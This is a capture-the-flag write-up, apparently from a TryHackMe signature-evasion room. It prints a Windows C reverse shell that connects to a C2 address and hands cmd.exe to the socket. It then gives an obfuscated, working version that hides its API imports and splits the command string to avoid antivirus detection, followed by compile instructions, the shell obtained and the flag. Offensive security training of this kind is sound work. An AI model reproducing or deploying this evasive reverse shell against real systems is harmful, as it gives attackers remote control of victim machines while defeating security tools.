void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
} 
```

Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or other C compiler. The file name must be saved as `challenge.exe`. Once compiled, submit the executable to the webserver at `http://MACHINE_IP/`[.](http://machine_ip/) If your payload satisfies the requirements listed, it will be ran and a beacon will be sent to the provided server IP and port.

Note: It is also essential to change the `C2Server` and `C2Port` variables in the provided payload or this challenge will not properly work and you will not receive a shell back. 

Note: When compiling with GCC you will need to add compiler options for `winsock2` and `ws2tcpip`. These libraries can be included using the compiler flags `-lwsock32` and `-lws2_32`


## Solution
---

Based on the exercise, we can modify this on the following way, make sure to change it to your `IP and PORT`:

```c
// challenge.c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int   (WSAAPI* WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET(WSAAPI* WSASOCKETA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef unsigned long (WSAAPI* INET_ADDR)(const char*);
typedef u_short (WSAAPI* HTONS)(u_short);
typedef int   (WSAAPI* WSACONNECT)(SOCKET, const struct sockaddr*, int,
                                   LPWSABUF, LPWSABUF, LPQOS, LPQOS);
typedef int   (WSAAPI* CLOSESOCKET)(SOCKET);
typedef int   (WSAAPI* WSACLEANUP)(void);

void runn(char* serv, int Port) {
    // 1. Load ws2_32.dll and grab the functions
    HMODULE hws = LoadLibraryW(L"ws2_32.dll");
    WSASTARTUP   myWSAStartup  = (WSASTARTUP)  GetProcAddress(hws, "WSAStartup");
    WSASOCKETA   myWSASocketA  = (WSASOCKETA)  GetProcAddress(hws, "WSASocketA");
    INET_ADDR    myinet_addr   = (INET_ADDR)   GetProcAddress(hws, "inet_addr");
    HTONS        myhtons       = (HTONS)       GetProcAddress(hws, "htons");
    WSACONNECT   myWSAConnect  = (WSACONNECT)  GetProcAddress(hws, "WSAConnect");
    CLOSESOCKET  myclosesocket = (CLOSESOCKET) GetProcAddress(hws, "closesocket");
    WSACLEANUP   myWSACleanup  = (WSACLEANUP)  GetProcAddress(hws, "WSACleanup");

    // 2. Initialize, create & connect socket
    WSADATA version;
    myWSAStartup(MAKEWORD(2,2), &version);

    SOCKET S0 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = myinet_addr(serv);
    addr.sin_port        = myhtons(Port);

    if (myWSAConnect(S0, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) 
        == SOCKET_ERROR) {
        myclosesocket(S0);
        myWSACleanup();
        return;
    }

    // 3. Spawn cmd.exe over the socket
    char p1[5] = "cm";
    char p2[6] = "d.exe";
    char cmd[10];
    strcpy(cmd, p1);
    strcat(cmd, p2);

    STARTUPINFOA sinfo = { sizeof(sinfo) };
    PROCESS_INFORMATION pinfo;
    sinfo.dwFlags      = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.hStdInput    = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)S0;

    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);

    // 4. Cleanup
    myclosesocket(S0);
    myWSACleanup();
}

int main(int argc, char** argv) {
    if (argc == 3) {
        int port = atoi(argv[2]);
        runn(argv[1], port);
    } else {
        // default back to IP:PORT
        char host[] = "VPN_IP";
        int port   = 9001;
        runn(host, port);
    }
    return 0;
}
```


We need to compile it:

```
x86_64-w64-mingw32-gcc -O2 -static -o challenge.exe challenge.c -lws2_32 -lwsock32
```

Now, we need to set up the listener on our specified port and submit the file:


![[Pasted image 20250521163547.png]]

![[Pasted image 20250521163551.png]]

![[Pasted image 20250521163600.png]]


We got our shell, let's read the flag:

```
C:\Users\Administrator\Desktop>type flag.txt
THM{08FU5C4710N_15 MY_10V3_14N6U463}
```

# Conclusion

---


Signature evasion can kick off the process of preparing a malicious application to evade cutting-edge solutions and detection measures.

In this room, we covered how to identify signatures and break various types of signatures.

The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.

At this point, you can begin understanding other more advanced detection measures or analysis techniques and continue improving your offensive tool craft.


